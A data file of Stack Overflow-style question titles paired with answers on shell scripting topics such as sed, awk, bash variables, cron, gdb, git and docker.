    "Difference between \"./\" and \"sh\" in UNIX": "sh file executes a shell-script file in a new shell process.\n. file executes a shell-script file in the current shell process.\n./file will execute the file in the current directory. The file can be a binary executable, or it can start with a hashbang line (the first line of the file in form of #!...., for example #!/usr/bin/ruby in a file would signify the script needs to be executed as a Ruby file). The file needs to have the executable flag set.\nFor example, if you have the script test.sh:\n#!/bin/sh\n\nTEST=present\nand you execute it with sh test.sh, you'd launch a new sh (or rather bash, most likely, as one is softlinked to the other in modern systems), then define a new variable inside it, then exit. A subsequent echo $TEST prints an empty line - the variable is not set in the outer shell.\nIf you launch it using . test.sh, you'd execute the script using the current shell. The result of echo $TEST would print present.\nIf you launch it using ./test.sh, the first line #!/bin/sh would be detected, then it would be exactly as if you wrote /bin/sh ./test.sh, which in this case boils down to the first scenario. But if the hashbang line was, for example, #!/usr/bin/perl -w, the file would have been executed with /usr/bin/perl -w ./test.sh.",
    "youtube-dl rate limit download speed and auto resume download [closed]": "You can use -r option to limit the speed. For example\nyoutube-dl -r 20K www.someurl.com\nThis will limit the speed to 20K. Note that speed is specified in bytes per second.",
    "Zsh tab-completion for \"cd ..\" [closed]": "Same problem with debian unstable, Ubuntu jaunty, both ship zsh 4.3.9. I know of multiple people with different configurations.\nAfter reading http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=514152 I added\nzstyle ':completion:*' special-dirs true\nto my config and now everything works fine again.",
    "sh read command eats backslashes in input?": "Accrding to: http://www.vias.org/linux-knowhow/bbg_sect_08_02_01.html :\n-r\nIf this option is given, backslash does not act as an escape character. The backslash is considered to be part of the line. In particular, a backslash-newline pair may not be used as a line continuation.\nIt works on my machine.\n$ echo '\\&|' | while read -r in; do echo \"$in\"; done\n\\&|",
    "How can I run Cygwin Bash Shell from within Emacs?": "shell-file-name is the variable that controls which shell Emacs uses when it wants to run a shell command.\nexplicit-shell-file-name is the variable that controls which shell M-x shell starts up.\nKen's answer changes both of those, which you may or may not want.\nYou can also have a function that starts a different shell by temporarily changing explicit-shell-file-name:\n(defun cygwin-shell ()\n  \"Run cygwin bash in shell mode.\"\n  (interactive)\n  (let ((explicit-shell-file-name \"C:/cygwin/bin/bash\"))\n    (call-interactively 'shell)))\nYou will probably also want to pass the --login argument to bash, because you're starting a new Cygwin session. You can do that by setting explicit-bash-args. (Note that M-x shell uses explicit-PROGRAM-args, where PROGRAM is the filename part of the shell's pathname. This is why you should not include the .exe when setting the shell.",
    "Brace expansion with range in fish shell": "The short answer is echo bunny(seq 6)\nLonger answer: In keeping with fish's philosophy of replacing magical syntax with concrete commands, we should hunt for a Unix command that substitutes for the syntactic construct {1..6}. seq fits the bill; it outputs numbers in some range, and in this case, integers from 1 to 6. fish (to its shame) omits a help page for seq, but it is a standard Unix/Linux command.\nOnce we have found such a command, we can leverage command substitutions. The command (foo)bar performs command substitution, expanding foo into an array, and may result in multiple arguments. Each argument has 'bar' appended.",
    "How do I insert a newline/linebreak after a line using sed": "For adding a newline after a pattern, you can also say:\nsed '/pattern/{G;}' filename\nQuoting GNU sed manual:\nG\n    Append a newline to the contents of the pattern space, and then append the contents of the hold space to that of the pattern space.\nEDIT:\nIncidentally, this happens to be covered in sed one liners:\n # insert a blank line below every line which matches \"regex\"\n sed '/regex/G'",
    "How do I upgrade Bash in Mac OSX Mountain Lion and set it the correct path? [closed]": "Update brew: brew update\nInstall bash with brew install bash\nAdd /usr/local/bin/bash to /etc/shells\nChange the default shell with chsh -s /usr/local/bin/bash\nYou don't normally have to change any settings in Terminal or iTerm 2. Both of them default to opening new shells with the default login shell.",
    "Mac OS X equivalent of Linux flock(1) command": "There is a cross-platform flock command here:\nhttps://github.com/discoteq/flock\nI have tested it and it works well on OSX as a drop-in replacement for the util-linux flock.",
    "How to Pass MULTIPLE filenames to a Context Menu Shell Command?": "You can use Send To for this. It supports multiple files.\nIn case this website goes offline:\nOpen shell:sendto with Windows + R or paste it into your explorer address bar. It should redirect you to:\nC:\\Users\\<yourusername>\\AppData\\Roaming\\Microsoft\\Windows\\SendTo\nCreate a shortcut to your program in this folder and you should see it in your explorer right-click menu under Send to",
    "MongoDB running but can't connect using shell": "I think there is some default config what is missing in this version of mongoDb client. Try to run:\nmongo 127.0.0.1:27017\nIt's strange, but then I've experienced the issue went away :) (so the simple command 'mongo' w/o any params started to work again for me)\n[Ubuntu Linux 11.10 x64 / MongoDB 2.0.1]",
    "zsh shortcut 'ctrl + A' not working": "If you're wondering why this happened: You likely have $EDITOR or $VISUAL set to vi/vim which made zsh default to the vi keymap which doesn't use ctrl+a for moving the caret.\nAdding bindkey -e to ~/.zshrc will restore the old behavior (emacs keymap).",
    "How to generate a list of all dates in a range using the tools available in bash?": "If you have GNU date, you could do use either a for loop in any POSIX-compliant shell:\n# with \"for\"\nfor i in {1..5}; do \n    # ISO 8601 (e.g. 2020-02-20) using -I\n    date -I -d \"2014-06-28 +$i days\"\n\n    # custom format using +\n    date +%Y/%m/%d -d \"2014-06-28 +$i days\"\ndone\nor an until loop, this time using Bash's extended test [[:\n# with \"until\"\nd=\"2014-06-29\"\nuntil [[ $d > 2014-07-03 ]]; do \n    echo \"$d\"\n    d=$(date -I -d \"$d + 1 day\")\ndone\nNote that non-ancient versions of sh will also do lexicographical comparison if you change the condition to [ \"$d\" \\> 2014-07-03 ].\nOutput from either of those loops:\n2014-06-29\n2014-06-30\n2014-07-01\n2014-07-02\n2014-07-03\nFor a more portable way to do the same thing, you could use a Perl script:\nuse strict;\nuse warnings;\nuse Time::Piece;\nuse Time::Seconds;    \nuse File::Fetch;\n\nmy ($t, $end) = map { Time::Piece->strptime($_, \"%Y-%m-%d\") } @ARGV; \n\nwhile ($t <= $end) {\n    my $url = \"http://www.example.com/\" . $t->strftime(\"%F\") . \".log\";\n    my $ff = File::Fetch->new( uri => $url );\n    my $where = $ff->fetch( to => '.' );  # download to current directory\n    $t += ONE_DAY;\n}\nTime::Piece, Time::Seconds and File::Fetch are all core modules. Use it like perl wget.pl 2014-06-29 2014-07-03.",
    "How can I generate new variable names on the fly in a shell script?": "You need to utilize Variable Indirection:\nSAMPLE1='1-first.with.custom.name'\nSAMPLE2='2-second.with.custom.name'\n\nfor (( i = 1; i <= 2; i++ ))\ndo\n   var=\"SAMPLE$i\"\n   echo ${!var}\ndone\nFrom the Bash man page, under 'Parameter Expansion':\n\"If the first character of parameter is an exclamation point (!), a level of variable indirection is introduced. Bash uses the value of the variable formed from the rest of parameter as the name of the variable; this variable is then expanded and that value is used in the rest of the substitution, rather than the value of parameter itself. This is known as indirect expansion.\"",
    "How to check return value from the shell directive": "How about using $? to echo the exit status of the last command?\nSVN_INFO := $(shell svn info . 2> /dev/null; echo $$?)\nifeq ($(SVN_INFO),1)\n    $(error \"Not an SVN repo...\")\nendif",
    "Running shell script using .env file": "You need to source the environment in the calling shell before starting the script:\nsource 'filename.env' && bash 'scriptname.sh'\nIn order to prevent polution of the environment of the calling shell you might run that in a sub shell:\n(source 'filename.env' && bash 'scriptname.sh')",
    "\"sed\" command in bash": "sed is the Stream EDitor. It can do a whole pile of really cool things, but the most common is text replacement.\nThe s,%,$,g part of the command line is the sed command to execute. The s stands for substitute, the , characters are delimiters (other characters can be used; /, : and @ are popular). The % is the pattern to match (here a literal percent sign) and the $ is the second pattern to match (here a literal dollar sign). The g at the end means to globally replace on each line (otherwise it would only update the first match).",
    "Check if a condition is false": "Do you mean:\nif ! [ 0 == 2 ]; then\n  echo Hello;\nfi\nYou lacked space around the equality operator.\nThis might be the time to read http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html - especially the sections about if then else and operators. I usually have this open when I am writing scripts..",
    "How to write buffer content to stdout?": "Since you use Linux/Unix, you might also be interested in trying out moreutils. It provides a command called vipe, which reads from stdin, lets you edit the text in $EDITOR, and then prints the modified text to stdout.\nSo make sure you set your editor to Vim:\nexport EDITOR=vim\nAnd then you can try these examples:\ncat /etc/fstab | vipe\ncut -d' ' -f2 /etc/mtab | vipe | less\n< /dev/null vipe",
    "Output file lines from last to first in Bash": "GNU (Linux) uses the following:\ntail -n 10 <logfile> | tac\ntail -n 10 <logfile> prints out the last 10 lines of the log file and tac (cat spelled backwards) reverses the order.\nBSD (OS X) of tail uses the -r option:\ntail -r -n 10 <logfile>\nFor both cases, you can try the following:\nif hash tac 2>/dev/null; then tail -n 10 <logfile> | tac; else tail -n 10 -r <logfile>; fi\nNOTE: The GNU manual states that the BSD -r option \"can only reverse files that are at most as large as its buffer, which is typically 32 KiB\" and that tac is more reliable. If buffer size is a problem and you cannot use tac, you may want to consider using @ata's answer which writes the functionality in bash.",
    "Why use $HOME over ~ (tilde) in a shell script?": "Tilde expansion doesn't work in some situations, like in the middle of strings like /foo/bar:~/baz",
    "What are shell form and exec form?": "These following explanation are from the Kubernetes In Action book(chapter 7).\nFirstly, They have both two different forms:\nshell form\u2014For example, ENTRYPOINT node app.js\nexec form\u2014For example, ENTRYPOINT [\"node\",\"app.js\"]\nActually The difference is whether the specified command is invoked inside a shell or not. I want to explain main difference between them with an example, too.\nENTRYPOINT [\"node\", \"app.js\"]\nThis runs the node process directly (not inside a shell), as you can see by listing the processes running inside the container:\n$ docker exec 4675d ps x  \nPID TTY      STAT   TIME    COMMAND\n1    ?        Ssl    0:00   node app.js   \n12   ?        Rs     0:00   ps x\nENTRYPOINT node app.js\nIf you\u2019d used the shell form (ENTRYPOINT node app.js), these would have been the container\u2019s processes:\n$ docker exec -it e4bad ps x  \nPID TTY      STAT   TIME    COMMAND    \n1    ?        Ss     0:00   /bin/sh -c node app.js\n7    ?        Sl     0:00   node app.js   \n13   ?        Rs+    0:00   ps x\nAs you can see, in that case, the main process (PID 1) would be the shell process instead of the node process. The node process (PID 7) would be started from that shell. The shell process is unnecessary, which is why you should always use the exec form of the ENTRYPOINT instruction.",
    "Difference between EUID and UID?": "They're different when a program is running set-uid. Effective UID is the user you changed to, UID is the original user.",
    "How to check if a number is within a range in shell": "If you are using Bash, you are better off using the arithmetic expression, ((...)) for readability and flexibility:\nif ((number >= 2 && number <= 5)); then\n  # your code\nfi\nTo read in a loop until a valid number is entered:\n#!/bin/bash\n\nwhile :; do\n  read -p \"Enter a number between 2 and 5: \" number\n  [[ $number =~ ^[0-9]+$ ]] || { echo \"Enter a valid number\"; continue; }\n  if ((number >= 2 && number <= 5)); then\n    echo \"valid number\"\n    break\n  else\n    echo \"number out of range, try again\"\n  fi\ndone\n((number >= 2 && number <= 5)) can also be written as ((2 <= number <= 5)).\nSee also:\nTest whether string is a valid integer\nHow to use double or single brackets, parentheses, curly braces",
    "unix- show the second line of the file": "You can also use \"sed\" or \"awk\" to print a specific line:\nEXAMPLE:\nsed -n '2p' myfile\nPS: As to \"what's wrong with my 'head|tail'\" command - shelltel is correct.",
    "GROUP BY/SUM from shell": "Edit: The modern (GNU/Linux) solution, as mentioned in comments years ago ;-) .\nawk '{\n    arr[$1]+=$2\n   }\n   END {\n     for (key in arr) printf(\"%s\\t%s\\n\", key, arr[key])\n   }' file \\\n   | sort -k1,1\nThe originally posted solution, based on old Unix sort options:\nawk '{\n    arr[$1]+=$2\n   }\n   END {\n     for (key in arr) printf(\"%s\\t%s\\n\", key, arr[key])\n   }' file \\\n   | sort +0n -1\nI hope this helps.",
    "Multiple replacements with one sed command": "Apple's man page says Multiple commands may be specified by using the -e or -f options. So I'd say\nfind . -type f -exec sed -i '' -e s/Red/$color1/g -e s/Blue/$color2/g {} \\;\nThis certainly works in Linux and other Unices.",
    "How to avoid a bash script from failing when -e option is set?": "You can \"catch\" the error using || and a command guaranteed to exit with 0 status:\nls $PATH || echo \"$PATH does not exist\"\nSince the compound command succeeds whether or not $PATH exists, set -e is not triggered and your script will not exit.\nTo suppress the error silently, you can use the true command:\nls $PATH || true\nTo execute multiple commands, you can use one of the compound commands:\nls $PATH || { command1; command2; }\nor\nls $PATH || ( command1; command2 )\nJust be sure nothing fails inside either compound command, either. One benefit of the second example is that you can turn off immediate-exit mode inside the subshell without affecting its status in the current shell:\nls $PATH || ( set +e; do-something-that-might-fail )",
    "How to set process group of a shell script": "As PSkocik points out, it is possible to run a process in its own process group, in most shells, by activating job control (\u201cmonitor mode\u201d).\n(set -m; exec process_in_its_own_group)\nLinux has a setsid utility, which runs the command passed as argument in its own session (using the eponymous system call). This is stronger than running it in its own process group \u00e0 la setpgrp, but that may be ok for your purpose.\nIf you want to place the process in an existing group rather than in its own group (i.e. if you want the full power of setpgid), there's no common shell utility. You have to use C/Perl/\u2026",
    "In Bash, how do I interpolate $(...) in a string?": "$(...) and other forms of substitutions are not interpolated in single-quoted strings.\nSo if you want your date calculated, do\ngit commit -m \"Database $(date '+%a %M:%H %h %d %Y')\"\nthat is, the whole message string is double-quoted to allow $(...) to be interpolated while the argument to date is in single quotes to make it a single argument (passed to date).",
    "Difference between shell and environment variables": "Citing this source,\nStandard UNIX variables are split into two categories, environment variables and shell variables. In broad terms, shell variables apply only to the current instance of the shell and are used to set short-term working conditions; environment variables have a farther reaching significance, and those set at login are valid for the duration of the session. By convention, environment variables have UPPER CASE and shell variables have lower case names.\nTo list all environment variables, use printenv and to list all shell variables, use set.\nYou'll note that the environment variables store more permanent value, e.g.:\nHOME=/home/adam\nWhich changes quite seldom, while the shell variables stores local, temporary, shell-specific values, e.g.:\nPWD=/tmp\nwhich changes every time you change your current directory.\nFor most practical tasks, set environment values by adding export VARIABLE_NAME=VALUE to your ~/.bashrc file.",
    "Use GDB to debug a C++ program called from a shell script": "In addition to options mentioned by @diverscuba23, you could do the following:\ngdb --args bash <script>\n(assuming it's a bash script. Else adapt accordingly)",
    "How to use `jq` to obtain the keys": "You can simply use: keys:\n% jq 'keys' my.json\n[\n  \"20160522201409-jobsv1-1\"\n]\nAnd to get the first:\n% jq -r 'keys[0]' my.json\n20160522201409-jobsv1-1\n-r is for raw output:\n--raw-output / -r: With this option, if the filter\u2019s result is a string then it will be written directly to standard output rather than being formatted as a JSON string with quotes. This can be useful for making jq filters talk to non-JSON-based systems.\nSource\nIf you want a known value below an unknown property, eg xxx.hostName:\n% jq -r '.[].hostName' my.json\n20160522201409-jobsv1-1",
    "Using output of awk to run command": "Use system from within awk:\nawk '{ system(\"openssl s_client -connect host:port -cipher \" $1) }' ciphers.txt",
    "How to cut a string after a specific character in unix": "Using sed:\n$ var=server@10.200.200.20:/home/some/directory/file\n$ echo $var | sed 's/.*://'\n/home/some/directory/file",
    "Capture output value from a shell command in VBA?": "Based on Andrew Lessard's answer, here's a function to run a command and return the output as a string -\nPublic Function ShellRun(sCmd As String) As String\n\n    'Run a shell command, returning the output as a string\n\n    Dim oShell As Object\n    Set oShell = CreateObject(\"WScript.Shell\")\n\n    'run command\n    Dim oExec As Object\n    Dim oOutput As Object\n    Set oExec = oShell.Exec(sCmd)\n    Set oOutput = oExec.StdOut\n\n    'handle the results as they are written to and read from the StdOut object\n    Dim s As String\n    Dim sLine As String\n    While Not oOutput.AtEndOfStream\n        sLine = oOutput.ReadLine\n        If sLine <> \"\" Then s = s & sLine & vbCrLf\n    Wend\n\n    ShellRun = s\n\nEnd Function\nUsage:\nMsgBox ShellRun(\"dir c:\\\")",
    "Invoke gdb to automatically pass arguments to the program being debugged": "The easiest way to do this given a program X and list of parameters a b c:\nX a b c\nIs to use gdb's --args option, as follows:\ngdb --args X a b c\ngdb --help has this to say about --args:\n--args             Arguments after executable-file are passed to inferior\nWhich means that the first argument after --args is the executable to debug, and all the arguments after that are passed as is to that executable.",
    "Changing permission for files and folder recursively using shell command in mac": "The issue is that the * is getting interpreted by your shell and is expanding to a file named TEST_FILE that happens to be in your current working directory, so you're telling find to execute the command named TEST_FILE which doesn't exist. I'm not sure what you're trying to accomplish with that *, you should just remove it.\nFurthermore, you should use the idiom -exec program '{}' \\+ instead of -exec program '{}' \\; so that find doesn't fork a new process for each file. With ;, a new process is forked for each file, whereas with +, it only forks one process and passes all of the files on a single command line, which for simple programs like chmod is much more efficient.\nLastly, chmod can do recursive changes on its own with the -R flag, so unless you need to search for specific files, just do this:\nchmod -R 777 /Users/Test/Desktop/PATH",
    "Execute a shell script everyday at specific time [duplicate]": "To add a crontab job, type the following command at a UNIX/Linux shell prompt:\n$ sudo crontab -e\nAdd the following line:\n1 2 3 4 5 /path/to/script\nwhere\n1: Minutes (0-59)\n2: Hours (0-23)\n3: Days (1-31)\n4: Month (1-12)\n5: Day of the week(1-7)\n/path/to/script - your own shell script\nIn your case it would be:\n55 23 * * * /path/to/yourShellScript",
    "How can I execute Shell script in Jenkinsfile?": "",
    "How do I execute a Shell built-in command with a C function?": "If you just want to execute the shell command in your c program, you could use,\n   #include <stdlib.h>\n\n   int system(const char *command);\nIn your case,\nsystem(\"pwd\");\nThe issue is that there isn't an executable file called \"pwd\" and I'm unable to execute \"echo $PWD\", since echo is also a built-in command with no executable to be found.\nWhat do you mean by this? You should be able to find the mentioned packages in /bin/\nsudo find / -executable -name pwd\nsudo find / -executable -name echo",
    "Execute shell command without filtering from Vim": "Select your block of text, then type these keys :w !sh\nThe whole thing should look like:\n:'<,'>w !sh\nThat's it. Only took me 8 years to learn that one : )\nnote: typing : after selecting text produces :'<,'> a range indicating selection start and end.\nUpdate 2016: This is really just one use of the generic:\n'<,'>w !cli_command\nWhich basically lets you \"send\" arbitrary parts of your file to external commands and see the results in a temporary vi window without altering your buffer. Other useful examples would be:\n'<,'>w !wc\n'<,'>w !to_file my_file\nI honestly find it more useful to alter the current buffer. This variety is simply:\n'<,'>!wc\n'<,'>!to_file my_file",
    "Concatenating every other line with the next": "This is easiest using paste:\npaste -s -d' \\n' input.txt \nAlthough there's a Famous Sed One-Liner (38) to emulate this as in potong's answer.",
    "Replace only if string exists in current line": "Solution\nAssuming your input file $target contains the following:\nsome text mystring some other text\nsome text mystring a searchstring\njust some more text\nThis command:\nsed -i -e '/searchstring/ s/mystring/1/ ; /searchstring/! s/mystring/0/' $target\nwill change its content to:\nsome text 0 some other text\nsome text 1 a searchstring\njust some more text\nExplanation\nThe script contains two substitute (s) commands separated by a semicolon.\nThe substitute command accepts an optional address range that select which lines the substitution should take place.\nIn this case regexp address was used to select lines containing the searchstring for the first command; and the lines that do not contain the searchstring (note the exclamation mark after the regexp negating the match) for the second one.\nEdit\nThis command will perform better and produce just the same result:\nsed -i -e '/searchstring/ s/mystring/1/ ; s/mystring/0/' $target\nThe point is that commands are executed sequentially and thus if there is still a mystring substring in the current line after the first command finished then there is no searchstring in it for sure.\nKudos to user946850.",
    "Unix command to escape spaces": "If you are using bash, you can use its builtin printf's %q formatter (type help printf in bash):\nFILENAME=$(printf %q \"$FILENAME\")\nThis will not only quote space, but also all special characters for shell.",
    "Can I use shell wildcards to select filenames ranging across double-digit numbers (e.g., from foo_1.jpg to foo_54.jpg)?": "I assume you want to copy these files to another directory:\ncp -t target_directory foo_{0..54}.jpg",
    "What's the difference between ln -s and alias?": "An Alias is a Macintosh Finder concept. When you make an Alias in the Finder, the Finder tracks it. When you move the original file or folder, the alias follows it.\nA symbolic link is a Unix File System concept. When you make a symbolic link, it merely points to the original location. Move the original, and the symbolic link will point nowhere.\nWhen you use a Mac application, and use the Open/Save dialog box, it will handle aliases because it uses the Finder API, and the Finder handles alias tracking.\nUnix tools don't integrate with the Finder API, so can't track aliases. However, they work with the underlying Unix API which handles symbolic links. You can use ls on a symbolic link because it uses the Unix API. Same with Python.\nBack in the System 7/8/9 days, the file system couldn't handle symbolic links much like the Windows API uses shortcuts and not symbolic links. You needed aliases.\nHowever, Mac OS X is a Unix based OS, so understands the concept of symbolic links. The Finder now treats symbolic links as it did aliases (except that symbolic links don't update when the original moves). The only reason for aliases is to be compatible with the old Finder file system.",
    "How to print regexp matches using awk? [duplicate]": "Yes, in awk use the match() function and give it the optional array parameter (a in my example). When you do this, the 0-th element will be the part that matched the regex\n$ echo \"blah foo123bar blah\" | awk '{match($2,\"[a-z]+[0-9]+\",a)}END{print a[0]}'\nfoo123",
    "return value from python script to shell script": "You can't return message as exit code, only numbers. In bash it can accessible via $?. Also you can use sys.argv to access code parameters:\nimport sys\nif sys.argv[1]=='hi':\n    print 'Salaam'\nsys.exit(0)\nin shell:\n#!/bin/bash\n# script for tesing\nclear\necho \"............script started............\"\nsleep 1\nresult=`python python/pythonScript1.py \"hi\"`\nif [ \"$result\" == \"Salaam\" ]; then\n    echo \"script return correct response\"\nfi",
    "How do I store the output of a git command in a variable?": "You can use:\nvar=$(git status 2>&1)\ni.e. redirect stderr to stdout and then capture the output.\nOtherwise when for error messages are written on stderr and your command: var=$(git status) is only capturing stdout.",
    "How to know if a docker container is running in privileged mode": "From the docker host\nUse the docker inspect command:\ndocker inspect --format='{{.HostConfig.Privileged}}' <container id>\nAnd within a bash script you could have a test:\nif [[ $(docker inspect --format='{{.HostConfig.Privileged}}' <container id>) == \"false\" ]]; then\n    echo not privileged\nelse\n    echo privileged\nfi\nFrom inside the container itself\nYou have to try to run a command that requires the --privileged flag and see if it fails\nFor instance ip link add dummy0 type dummy is a command which requires the --privileged flag to be successful:\n$ docker run --rm -it ubuntu ip link add dummy0 type dummy\nRTNETLINK answers: Operation not permitted\nwhile\n$ docker run --rm -it --privileged ubuntu ip link add dummy0 type dummy\nruns fine.\nIn a bash script you could do something similar to this:\nip link add dummy0 type dummy >/dev/null\nif [[ $? -eq 0 ]]; then\n    PRIVILEGED=true\n    # clean the dummy0 link\n    ip link delete dummy0 >/dev/null\nelse\n    PRIVILEGED=false\nfi",
    "Combining mingw and git": "Small update: Since the Git 2.x releases, Git for Windows is based off of MSYS2 and available in 32 and 64 bit binary form. It still is a fork, and not interchangeable with the real MSYS2.\nOne thing you must understand: msysgit (the git you are using) is a fork of msys with added git functionality. A lot of unix tools are included in the msys shell (for a full list, see the msysgit/bin folder).\nIt might be possible to add additional msys tools to the msysgit bin folder, but I would not risk my head on that.\nIn light of this, I think it would be optimal to just add your toolchain to the msysgit path (using the bash profile file or whatever in the msysgit tree) and just use that. If a particular utility is missing, add it from the MinGW-msys tree and hope it works OK.\nAlternatively, just use msys-git from cmd.exe. Since recent versions, it works very well (including git show, editing commit messages etc...). To do that, add the /cmd directory to PATH, and you can use all the git commands you want. This is what I do, as msys is a drag, but a necessary evil for git to work on Windows.\nUPDATE: detailed instructions to add a directory to PATH under any kind of MSYS:\nexport PATH=/d/MinGW/bin:$PATH\nor hackishly find /etc/profile and change this section\nif [ $MSYSTEM == MINGW32 ]; then\n  export PATH=\".:/usr/local/bin:/mingw/bin:/bin:$PATH\"\nelse\n  export PATH=\".:/usr/local/bin:/bin:/mingw/bin:$PATH\"\nfi\nto:\nif [ $MSYSTEM == MINGW32 ]; then\n  export PATH=\".:/usr/local/bin:/d/MinGW/bin:/bin:$PATH\"\nelse\n  export PATH=\".:/usr/local/bin:/bin:/mingw/bin:$PATH\"\nfi\nThere is no cleaner way because the msys-git people disabled the fstab functionality present in vanilla msys.\nUpdate from Nick (what I did to make it work):\nI created file in C:\\Program Files\\Git\\etc called bash_profile. This is the contents of the file:\nexport PATH=$PATH:/d/mingw/bin:/d/mingw/msys/1.0/bin\nmake and gcc worked.\nThe bash_profile does not come with msysgit so you won't overwrite it if you update.",
    "What does -ex option used in bash | #!/bin/bash -ex mean": "According to Add tack e x on your bash shebang | #!/bin/bash -ex\nBash scripts can use various options on the shebang (#!/bin/bash). A more common one is: \u2018#!/bin/bash -ex\u2019.\n-e Exit immediately if a command exits with a non-zero status.\n-x Print commands and their arguments as they are executed.\nIn short, adding -ex to your #!/bin/bash will give verbose output and also will abort your script immediately if part of the script fails.",
    "Run a shell script with an html button": "As stated by Luke you need to use a server side language, like php. This is a really simple php example:\n<?php\nif ($_GET['run']) {\n  # This code will run if ?run=true is set.\n  exec(\"/path/to/name.sh\");\n}\n?>\n\n<!-- This link will add ?run=true to your URL, myfilename.php?run=true -->\n<a href=\"?run=true\">Click Me!</a>\nSave this as myfilename.php and place it on a machine with a web server with php installed. The same thing can be accomplished with asp, java, ruby, python, ...",
    "How to create a zip file using shell script?": "From your question, I understand that you want to zip the files in the \"Results\" directory without considering the directory \"Results\" itself when trying to zip.\nIf so, then use the below commands\n#!/bin/bash\ncd /home/admin/1/2/3/Results\nzip -r /home/admin/download.zip ./*\nAfter this, the zip file would be created in the required location. Zip file is with only the files from the result directory, without the \"Result\" directory itself.",
    "Setting default database for MongoDB shell": "Command Line\nYou can select the database to use on the mongo command line, eg for 'mydb':\nmongo mydb\nIf a database name is not provided, 'test' will be used.\nIn .mongorc.js\nIf you want to set a default database without specifying on the command line each time, you can add a line to the .mongorc.js file in your home directory:\ndb = db.getSiblingDB(\"mydb\")\nThe .mongorc.js file is executed after the mongo shell is started, so if you set a default here it will override a database specified on the command line.",
    "How to get Git log with short stat in one line?": "git log --oneline --pretty=\"@%h\" --stat | grep -v \\| | tr \"\\n\" \" \" |  tr \"@\" \"\\n\"\nThis will show something like this:\na596f1e   1 file changed, 6 insertions(+), 3 deletions(-) \n4a9a4a1   1 file changed, 6 deletions(-) \nb8325fd   1 file changed, 65 insertions(+), 4 deletions(-) \n968ef81   1 file changed, 4 insertions(+), 5 deletions(-) ",
    "Is there a way to get my emacs to recognize my bash aliases and custom functions when I run a shell command?": "Below are my comments about what I think was a related question:\nI think both M-x shell-command and M-x compile execute commands in an inferior shell via call-process. Try the following in your .emacs (or just evaluate):\n(setq shell-file-name \"bash\")\n(setq shell-command-switch \"-ic\")\nI notice that after evaluation of the above, .bashrc aliases are picked up for use by both M-x shell-command and M-x compile, i.e\nM-x compile RET your_alias RET\nshould then work.\nMy environment: Emacs 24.1 (pretest rc1), OSX 10.7.3\nSource",
    "How to redirect an output file descriptor of a subshell to an input file descriptor in the parent shell?": "BEWARE, BASHISM AHEAD (there are posix shells that are significantly faster than bash, e.g. ash or dash, that don't have process substitution).\nYou can do a handle dance to move original standard output to a new descriptor to make standard output available for piping (from the top of my head):\nexec 3>&1 # open 3 to the same output as 1\nrun_in_subshell() { # just shortcut for the two cases below\n    echo \"This goes to STDOUT\" >&3\n    echo \"And this goes to THE OTHER FUNCTION\"\n}\nNow you should be able to write:\nwhile read line; do\n    process $line\ndone < <(run_in_subshell)\nbut the <() construct is a bashism. You can replace it with pipeline\nrun_in_subshell | while read line; do\n    process $line\ndone\nexcept than the second command also runs in subshell, because all commands in pipeline do.",
    "Sending mail from a Bash shell script": "Previously, this answer was based on the default inclusion of a recent Python on Mac OS X. Since then, the Python ecosystem has evolved and Python is not available on a clean install. This answer has been updated for modern systems, but is much more involved and exceeds the scope of the original poster's request.\nPython and it's built-in standard library provides some nice facilities for sending email if you're willing to install it. Consider using the stock installer or installing homebrew followed by brew install python.\nFrom there, customize the following script based on stock examples to suit your needs.\n# Settings\n\nSMTP_SERVER = 'mail.myisp.com'\nSMTP_PORT = 25\nSMTP_USERNAME = 'myusername'\nSMTP_PASSWORD = '$uper$ecret'\nSMTP_FROM = 'sender@example.com'\nSMTP_TO = 'recipient@example.com'\n\nTEXT_FILENAME = '/script/output/my_attachment.txt'\nMESSAGE = \"\"\"This is the message\nto be sent to the client.\n\"\"\"\n\n# Now construct the message\nimport pathlib\nimport smtplib\nimport email.message\n\nmsg = email.message.EmailMessage()\nmsg.set_content(MESSAGE)\ntext_path = pathlib.Path(TEXT_FILENAME)\nmsg.add_attachment(\n    text_path.read_text(),\n    maintype='text',\n    subtype='plain',\n    filename=text_path.name,\n)\nmsg['From'] = SMTP_FROM\nmsg['To'] = SMTP_TO\n# msg['Subject'] = SMTP_SUBJECT\n\n# Now send the message\nwith smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as mailer:\n    mailer.login(SMTP_USERNAME, SMTP_PASSWORD)\n    mailer.send_message(msg)\nI hope this helps.",
    "Run C or C++ file as a script": "Short answer:\n//usr/bin/clang \"$0\" && exec ./a.out \"$@\"\nint main(){\n    return 0;\n}\nThe trick is that your text file must be both valid C/C++ code and shell script. Remember to exit from the shell script before the interpreter reaches the C/C++ code, or invoke exec magic.\nRun with chmod +x main.c; ./main.c.\nA shebang like #!/usr/bin/tcc -run isn't needed because unix-like systems will already execute the text file within the shell.\n(adapted from this comment)\nI used it in my C++ script:\n//usr/bin/clang++ -O3 -std=c++11 \"$0\" && ./a.out; exit\n#include <iostream>\nint main() {\n    for (auto i: {1, 2, 3})\n        std::cout << i << std::endl;\n    return 0;\n}\nIf your compilation line grows too much you can use the preprocessor (adapted from this answer) as this plain old C code shows:\n#if 0\n    clang \"$0\" && ./a.out\n    rm -f ./a.out\n    exit\n#endif\nint main() {\n    return 0;\n}\nOf course you can cache the executable:\n#if 0\n    EXEC=${0%.*}\n    test -x \"$EXEC\" || clang \"$0\" -o \"$EXEC\"\n    exec \"$EXEC\"\n#endif\nint main() {\n    return 0;\n}\nNow, for the truly eccentric Java developer:\n/*/../bin/true\n    CLASS_NAME=$(basename \"${0%.*}\")\n    CLASS_PATH=\"$(dirname \"$0\")\"\n    javac \"$0\" && java -cp \"${CLASS_PATH}\" ${CLASS_NAME}\n    rm -f \"${CLASS_PATH}/${CLASS_NAME}.class\"\n    exit\n*/\nclass Main {\n    public static void main(String[] args) {\n        return;\n    }\n}\nD programmers simply put a shebang at the beginning of text file without breaking the syntax:\n#!/usr/bin/rdmd\nvoid main(){}\nSee:\nhttps://unix.stackexchange.com/a/373229/23567\nhttps://stackoverflow.com/a/12296348/199332",
    "Shell script to check whether a server is reachable?": "The most barebones check you can do is probably to use netcat to check for open ports.\nto check for SSH (port 22) reachability, you can do\nif nc -z $server 22 2>/dev/null; then\n    echo \"$server \u2713\"\nelse\n    echo \"$server \u2717\"\nfi\nfrom the manpage:\n-z \u2003 Specifies that nc should just scan for listening daemons, without sending any data to them.",
